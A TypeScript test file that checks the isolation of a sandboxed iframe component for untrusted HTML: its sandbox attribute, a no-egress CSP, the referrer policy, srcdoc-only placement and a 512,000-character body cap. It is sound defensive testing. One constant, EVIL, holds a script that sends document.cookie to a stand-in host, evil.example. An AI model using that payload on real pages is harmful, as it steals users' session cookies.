/**
 * ADR 0128 Phase 2 + IART-6 — SECURITY tests for the sandboxed interactive-artifact frame.
 * These assert the isolation invariants that keep untrusted HTML from touching the
 * parent, ON THE RENDERED IFRAME (not just the exported constants): no
 * allow-same-origin, a no-egress CSP with `img-src data:` only, no referrer, the body
 * only in srcdoc, and the 512,000-char body cap at its boundary. The frame is
 * always-on (the interactive-artifacts toggle was removed), so no feature gate is mocked.
 *
 * Posture values are pinned as LITERALS (never built from the exported constants),
 * so a loosened constant moves the product and not the expectation.
 */
import { describe, it, expect, afterEach } from 'vitest';
import { render, cleanup } from '@testing-library/react';
import { SandboxedArtifactFrame, buildArtifactSrcdoc, ARTIFACT_SANDBOX, ARTIFACT_CSP } from '../SandboxedArtifactFrame.js';

afterEach(cleanup);

const EVIL = '<script>fetch("https://evil.example/?c="+document.cookie)</script><h1>art</h1>';
const CSP_LITERAL = "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:;";
const CSP_META = `<meta http-equiv="Content-Security-Policy" content="${CSP_LITERAL}">`;

function renderedSrcdoc(body: string): string {
  const { container } = render(<SandboxedArtifactFrame body={body} />);
  const srcdoc = container.querySelector('iframe')?.getAttribute('srcdoc');
  if (srcdoc == null) throw new Error('no iframe srcdoc rendered');
  return srcdoc;
}

/** The untrusted body as it sits inside the rendered document's <body>. */
function bodyOf(srcdoc: string): string {
  return srcdoc.slice(srcdoc.indexOf('<body>') + '<body>'.length, srcdoc.lastIndexOf('</body>'));
}

describe('SandboxedArtifactFrame — isolation invariants', () => {
  it('sandboxes WITHOUT allow-same-origin (opaque origin, no parent/cookie access) and sends no referrer', () => {
    const { container } = render(<SandboxedArtifactFrame body={EVIL} />);
    const iframe = container.querySelector('iframe')!;
    expect(iframe.getAttribute('sandbox')).toBe('allow-scripts');
    expect(iframe.getAttribute('referrerpolicy')).toBe('no-referrer');
  });

  it('injects a no-egress CSP (default-src none, img-src data: only) into the RENDERED frame', () => {
    expect(ARTIFACT_CSP).toBe(CSP_LITERAL);
    const srcdoc = renderedSrcdoc(EVIL);
    // The rendered frame carries the exact policy, in <head>, before the untrusted body.
    expect(srcdoc).toContain(CSP_META);
    expect(srcdoc.indexOf(CSP_META)).toBeLessThan(srcdoc.indexOf('<body>'));
    // The exported helper carries the same literal policy (other callers use it).
    expect(buildArtifactSrcdoc('x')).toContain(CSP_META);
  });

  it('puts the untrusted body ONLY in srcdoc — never the parent DOM', () => {
    const { container } = render(<SandboxedArtifactFrame body={EVIL} />);
    // The parent must not contain the raw <script>/<h1> as real DOM nodes.
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('h1')).toBeNull();
    // It lives in the iframe srcdoc (a string attribute), origin-isolated.
    expect(bodyOf(container.querySelector('iframe')!.getAttribute('srcdoc')!)).toBe(EVIL);
  });

  it('IART-6: caps the body at exactly 512,000 chars (boundary: at the cap untouched, one over truncated)', () => {
    expect(bodyOf(renderedSrcdoc('a'.repeat(512_000))).length).toBe(512_000);
    cleanup();
    expect(bodyOf(renderedSrcdoc('a'.repeat(512_001))).length).toBe(512_000);
    cleanup();
    const huge = bodyOf(renderedSrcdoc('a'.repeat(600_000)));
    expect(huge.length).toBe(512_000);
    expect(huge).toBe('a'.repeat(512_000)); // the (truncated) content still renders
  });

  it('ARTIFACT_SANDBOX is allow-scripts only', () => {
    // Redundant with the rendered-attribute case above; kept (protected security file).
    expect(ARTIFACT_SANDBOX).toBe('allow-scripts');
  });
});
